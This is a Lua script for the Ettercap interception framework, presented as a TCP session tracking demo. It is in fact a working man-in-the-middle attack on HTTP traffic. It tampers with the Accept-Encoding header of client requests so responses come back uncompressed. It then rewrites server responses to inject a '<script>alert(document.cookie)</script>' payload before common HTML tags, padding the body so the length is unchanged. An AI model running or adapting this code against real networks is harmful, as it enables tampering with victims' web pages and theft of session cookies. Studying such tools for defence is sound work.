---
--    Copyright (C) Ryan Linn and Mike Ryan
--
--    This program is free software; you can redistribute it and/or modify
--    it under the terms of the GNU General Public License as published by
--    the Free Software Foundation; either version 2 of the License, or
--    (at your option) any later version.
--
--    This program is distributed in the hope that it will be useful,
--    but WITHOUT ANY WARRANTY; without even the implied warranty of
--    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
--    GNU General Public License for more details.
--
--    You should have received a copy of the GNU General Public License
--    along with this program; if not, write to the Free Software
--    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.


description = "This demonstrates TCP session tracking.";


local ffi = require('ettercap_ffi')
local eclib = require('eclib')
local hook_points = require("hook_points")
local shortsession = require("shortsession")
local packet = require("packet")

-- We have to hook at the filtering point so that we are certain that all the 
-- dissectors hae run.
hook_point = hook_points.filter

function split_http(str)
  local break_start, header_end= string.find(str, '\r?\n\r?\n')
  if header_end == nil then
    -- We only see the headers. So, that's all we got.
    header_end = string.len(str)
  end

  local header = string.sub(str, 0, header_end)
  local body = string.sub(str,header_end+1)
  
  return header, body
end

function shrink_http_body(body)
  local modified_body = string.gsub(body, '>%s*<','><')
  return modified_body
end

function pad_http_body(body, len)
  if len <= 0 then
    return body
  end
  local padded_sep = ">" .. string.rep(" ", len) .. "<"
  local modified_body = string.gsub(body, '><',padded_sep, 1)
  return modified_body
end

-- We only want to mess around with TCP streams that have data.
packetrule = function(packet_object)
  if packet.is_tcp(packet_object) == false then
    return false
  end

  if packet_object.DATA.len == 0 then
    return false
  end

  return true
end

local session_key_func = shortsession.tcp_session("tcp_session_demo")
local create_namespace = ettercap.reg.create_namespace

local http_states = {}
http_states.request_seen  = 1
http_states.response_seen = 2
http_states.body_seen     = 3
http_states.injected      = 4

function handle_request(session_data, packet_object)
  local buf = packet.read_data(packet_object, 4) 
  if buf == "GET " then
    session_data.http_state = http_states.request_seen
  end

  if session_data.http_state == http_states.request_seen then
    local request =  packet.read_data(packet_object)
    local mod_request = string.gsub(request, '[Aa]ccept-[Ee]ncoding', "Xccept-Xncoding", 1)
    if not request == mod_request then
      packet.set_data(packet_object, mod_request)
    end
  end
end
function nocase (s)
  s = string.gsub(s, "%a", function (c)
    return string.format("[%s%s]", string.lower(c),
    string.upper(c))
  end)
  return s
end

local inject_patterns = {
  nocase("(<body[> ])"),
  nocase("(<head[> ])"),
  nocase("(<meta[> ])"),
  nocase("(<title[> ])"),
  nocase("(><a[> ])")
}
local inject_string = '<script>alert(document.cookie)</script>%1'
local inject_str_len = string.len(inject_string) - 2

function inject_body(orig_body)
  if orig_body == nil then
    return nil
  end
  local orig_body_len = string.len(orig_body)

  -- Try to shrink the body down.
  local shrunk_body = shrink_http_body(orig_body)
  local shrunk_body_len = string.len(shrunk_body)

  local delta = orig_body_len - shrunk_body_len - inject_str_len
  if delta < 0 then
    -- no room to inject our stuff! return.
    return nil
  end

  for i,pattern in pairs(inject_patterns) do

    local offset = string.find(shrunk_body, pattern)
    local modified_body = string.gsub(shrunk_body, pattern, inject_string, 1)
    local modified_body_len = string.len(modified_body)
    if not (modified_body_len == shrunk_body_len) then
      -- Alright, let's pad things a little bit.
      local padded_body = pad_http_body(modified_body, delta)
      return padded_body
    end
  end

  return nil
end

function handle_response(session_data, packet_object)
  -- If we do'nt have a state, then we shouldn't be doing anything!
  if session_data.http_state == nil then
    return nil
  end

  -- If we have already injected, then don't do anything.
  if session_data.http_state == http_states.injected then
    return nil
  end

  if session_data.http_state == http_states.request_seen then
    local buf = packet.read_data(packet_object, 8) 
    if not buf == "HTTP/1." then
      return nil
    end
    session_data.http_state = http_states.response_seen
    -- Since we're in the header, let's see if we can find the body.
  end

  local buf = packet.read_data(packet_object) 
  local header = nil
  local body = nil
  if session_data.http_state == http_states.response_seen then
    -- Let's try to find the body.
    local split_header, split_body = split_http(buf)

    if not split_body then
      -- No dice, didn't find the body.
      return nil
    end

    -- Keep track of our header.
    if split_header then
      header = split_header
    end
    -- Stash our body.
    body = split_body

    session_data.http_state = http_states.body_seen
  end

  if session_data.http_state == http_states.body_seen then
    -- If we didn't already grab the body, then we aren't in the first packet
    -- for the response. That means that 
    --
    if not body then
      body = buf
    end

    local new_body = inject_body(body)
    if new_body == nil then
      return nil
    end

    session_data.http_state = http_states.injected
    if header == nil then
      header = ""
    end

    local new_data = header .. new_body

    -- Set the modified data
    packet.set_data(packet_object, new_data)
  end
end

-- Here's your action.
action = function(packet_object) 
  local session_id = session_key_func(packet_object)
  if not session_id then
    -- If we don't have session_id, then bail.
    return nil
  end

  local ident_ptr = ffi.new("void *")
  local ident_ptr_ptr = ffi.new("void *[1]", ident_ptr)
  local ident_len = ffi.C.tcp_create_ident(ident_ptr_ptr, packet_object);

  local session_ptr = ffi.new("struct ec_session *")
  local session_ptr_ptr = ffi.new("struct ec_session *[1]", session_ptr)
  local ret = ffi.C.session_get(session_ptr_ptr, ident_ptr_ptr[0], ident_len) 
  if ret == -ffi.C.E_NOTFOUND then
    return nil
  end

  -- Find the direction of our current TCP packet. 
  -- 0 == client -> server
  -- 1 == server -> client
  local dir = ffi.C.tcp_find_direction(session_ptr_ptr[0].ident, ident_ptr_ptr[0])

  -- Now we are going to try to figure out if which direction things are
  -- going in.

  -- Get our session data...
  local session_data = create_namespace(session_id)

  if dir == 0 then
    handle_request(session_data, packet_object)
  else 
    handle_response(session_data, packet_object)
  end

  -- ettercap.log("tcp_session_demo: %d %s:%d -> %s:%d - state: %s\n", dir, src_ip, src_port, 
  --                  dst_ip, dst_port, tostring(session_data.http_state))

end
